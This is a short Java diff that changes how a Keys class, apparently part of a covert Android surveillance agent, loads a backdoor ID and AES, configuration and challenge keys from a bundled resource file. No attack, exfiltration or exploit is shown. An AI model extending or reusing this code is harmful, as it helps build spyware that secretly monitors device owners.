@@ -21,9 +21,6 @@ import com.android.service.util.Utils;
  */
 public class Keys {
 
-	/** The use fake. */
-	static boolean useFake = Cfg.KEYS;
-
 	/** The singleton. */
 	private volatile static Keys singleton;
 
@@ -36,7 +33,7 @@ public class Keys {
 		if (singleton == null) {
 			synchronized (Keys.class) {
 				if (singleton == null) {
-					if (useFake) {
+					if (Cfg.KEYS) {
 						singleton = new KeysFake();
 					} else {
 						singleton = new Keys(true);
@@ -60,10 +57,10 @@ public class Keys {
 			final byte[] resource = Utils.inputStreamToBuffer(
 					resources.openRawResource(R.raw.resources), 0); // resources.bin
 
-			backdoorId = Utils.copy(resource, 64, 14);
-			aesKey = keyFromString(resource, 142, 32);
-			confKey = keyFromString(resource, 238, 32);
-			challengeKey = keyFromString(resource, 334, 32);
+			backdoorId = Utils.copy(resource, 0, 14);
+			aesKey = keyFromString(resource, 14, 32);
+			confKey = keyFromString(resource, 46, 32);
+			challengeKey = keyFromString(resource, 78, 32);
 
 		}
 
